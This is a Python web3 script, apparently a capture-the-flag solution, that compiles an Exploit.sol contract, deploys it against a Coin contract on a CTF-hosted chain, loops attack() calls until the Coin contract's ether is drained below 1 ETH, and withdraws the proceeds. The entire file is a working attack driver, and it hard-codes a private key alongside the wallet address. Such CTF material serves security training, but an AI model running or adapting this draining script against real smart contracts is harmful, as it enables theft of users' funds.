import time
import json
from web3 import Web3
from solcx import compile_standard, install_solc

# Configuration
RPC_URL = "http://public.ctf.r0devnull.team:3001/6f5b4875-c6a9-48c8-8152-ea20494e8e18"
PRIVKEY = "9c1a9553b9449cd83ec51e8f0ca5c4f36c47081f22ecf530e35e651e21186f7f"
SETUP_CONTRACT_ADDR = "0x9b198D366513F2814779223057021f57A034D7FC"
WALLET_ADDR = "0xb8cbDAe1A0d37B60D870557b9E8A61390b0ffa3D"

# Connect to Web3
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("Failed to connect to Web3")
    exit(1)

print(f"Connected to {RPC_URL}")
print(f"Current block: {w3.eth.block_number}")
print(f"Wallet balance: {w3.from_wei(w3.eth.get_balance(WALLET_ADDR), 'ether')} ETH")

# Install Solc
print("Installing solc...")
install_solc('0.8.0')

# Compile Contracts
print("Compiling contracts...")
with open("Exploit.sol", "r") as f:
    exploit_source = f.read()
with open("Coin.sol", "r") as f:
    coin_source = f.read()
with open("ERC20.sol", "r") as f:
    erc20_source = f.read()

compiled_sol = compile_standard(
    {
        "language": "Solidity",
        "sources": {
            "Exploit.sol": {"content": exploit_source},
            "Coin.sol": {"content": coin_source},
            "ERC20.sol": {"content": erc20_source}
        },
        "settings": {
            "outputSelection": {
                "*": {
                    "*": ["abi", "metadata", "evm.bytecode", "evm.sourceMap"]
                }
            }
        },
    },
    solc_version="0.8.0",
)

bytecode = compiled_sol["contracts"]["Exploit.sol"]["Exploit"]["evm"]["bytecode"]["object"]
abi = compiled_sol["contracts"]["Exploit.sol"]["Exploit"]["abi"]

# Get Coin Address from Setup
print("Getting Coin address from Setup...")
# coin is at slot 0 of Setup
coin_slot = w3.eth.get_storage_at(SETUP_CONTRACT_ADDR, 0)
coin_address = w3.to_checksum_address(coin_slot[-20:])
print(f"Coin address: {coin_address}")

# Deploy Exploit
print("Deploying Exploit...")
Exploit = w3.eth.contract(abi=abi, bytecode=bytecode)

# Build transaction
nonce = w3.eth.get_transaction_count(WALLET_ADDR)
tx = Exploit.constructor(coin_address).build_transaction({
    'chainId': w3.eth.chain_id,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price,
    'nonce': nonce,
    'value': w3.to_wei(1, 'ether') # Fund with 1 ETH
})

# Sign and send
signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
print(f"Deploy transaction sent: {tx_hash.hex()}")

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
exploit_address = tx_receipt.contractAddress
print(f"Exploit deployed at: {exploit_address}")

# Attack
print("Executing attack loop...")
exploit_contract = w3.eth.contract(address=exploit_address, abi=abi)

for i in range(10):
    print(f"Attack iteration {i+1}...")
    nonce = w3.eth.get_transaction_count(WALLET_ADDR)
    tx = exploit_contract.functions.attack().build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 10000000, 
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce
    })

    signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Attack transaction sent: {tx_hash.hex()}")

    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Attack transaction status: {tx_receipt.status}")
    if tx_receipt.status == 0:
        print("Attack transaction REVERTED")
        break
    
    # Check Coin balance
    coin_balance = w3.eth.get_balance(coin_address)
    print(f"Coin contract balance: {w3.from_wei(coin_balance, 'ether')} ETH")
    if coin_balance < w3.to_wei(1, 'ether'):
        print("SUCCESS: Coin contract drained below 1 ETH!")
        break

# Withdraw
print("Withdrawing funds...")
nonce = w3.eth.get_transaction_count(WALLET_ADDR)
tx = exploit_contract.functions.withdraw().build_transaction({
    'chainId': w3.eth.chain_id,
    'gas': 200000,
    'gasPrice': w3.eth.gas_price,
    'nonce': nonce
})
signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Withdraw status: {tx_receipt.status}")
